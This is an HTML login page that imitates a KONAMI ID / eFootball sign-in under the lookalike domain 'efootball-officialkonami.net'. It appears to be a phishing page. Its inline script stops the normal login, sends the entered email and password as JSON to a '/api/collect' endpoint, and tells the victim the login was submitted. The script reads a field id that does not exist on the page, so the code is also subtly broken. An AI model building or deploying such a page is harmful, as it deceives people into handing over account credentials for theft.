<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>efootball-officialkonami.net</title>
    <link rel="stylesheet" href="style.css">
    <!-- Link to Google Fonts for similar typography -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        /* Add this CSS for the new buttons */
        .extra-options {
            margin-top: 40px;
            padding: 25px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #333;
            border-radius: 8px;
            text-align: center;
        }
        
        .extra-options p {
            color: #999;
            margin-bottom: 15px;
            font-size: 14px;
        }
        
        .note {
            margin-top: 20px;
            font-size: 12px !important;
            color: #666 !important;
        }
        
        .btn-full-website,
        .btn-login-only {
            display: block;
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            text-decoration: none;
            border-radius: 4px;
            font-weight: 600;
            text-align: center;
            transition: all 0.3s;
            font-size: 14px;
            cursor: pointer;
        }
        
        .btn-full-website {
            background: #0070cc;
            color: white;
            border: none;
        }
        
        .btn-full-website:hover {
            background: #005ca9;
            transform: translateY(-2px);
        }
        
        .btn-login-only {
            background: transparent;
            color: #999;
            border: 1px solid #444;
        }
        
        .btn-login-only:hover {
            background: rgba(255, 255, 255, 0.05);
            color: white;
            border-color: #666;
        }
        
        .message {
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            text-align: center;
            display: none;
        }
        
        .success {
            background: rgba(0, 112, 204, 0.1);
            border: 1px solid #0070cc;
            color: #0070cc;
        }
        
        .error {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid #ff4444;
            color: #ff4444;
        }
    </style>
</head>
<body>
    <div class="top-corner-box">
        <span class="konami-red">KONAMI</span>
    </div>

    <div class="login-container">
        <div class="logo-box">
            <!-- Placeholder for KONAMI logo image -->
            <div class="logo-placeholder">KONAMI ID</div>
        </div>
        
        <!-- Message display area -->
        <div id="message" class="message"></div>
        
        <!-- UPDATED FORM -->
        <form id="loginForm" class="login-form">
            <!-- Your form fields -->
            <div class="input-group">
                <input type="text" id="username" name="username" required>
                <label for="username">KONAMI ID/EMAIL ADDRESS</label>
            </div>
            
            <div class="input-group">
                <input type="password" id="password" name="password" required>
                <label for="password">Password</label>
            </div>
            
            <button type="submit" class="btn-login">LOGIN</button>

            <div class="divider">OR</div>

            <button type="button" class="btn-google">
                <span class="google-icon">G</span> Log in with Google Play
            </button>

            <div class="register-link">
                Don't have a KONAMI ID? <a href="#" class="register-red">Register</a>
            </div>
        </form>
        
        <!-- ADDED THIS SECTION: Extra Options -->
        <div class="extra-options">
            <p>Alternative login options:</p>
            <a href="index.html" class="btn-full-website">
                Visit Full eFootball Website
            </a>
            <p class="note">Or click below for a different login experience:</p>
            <a href="login.html" class="btn-login-only">
                Go to Login Page Only
            </a>
        </div>
    </div>

    <footer class="page-footer">
        <div class="footer-links">
            <a href="#">Terms of Use / Privacy (KONAMI ID)</a>
            <a href="#">Trademarks</a>
            <a href="#">Support</a>
            <a href="#">Company Information</a>
        </div>
    </footer>

    <!-- UPDATED JavaScript -->
<script>
  document.getElementById("loginForm").addEventListener("submit", async function (e) {
    e.preventDefault();

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    try {
      const response = await fetch("/api/collect", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ email, password })
      });

      if (response.ok) {
        alert("Login submitted");
      } else {
        alert("Submission failed");
      }
    } catch (err) {
      alert("Network error");
    }
  });
</script>
</body>
</html>
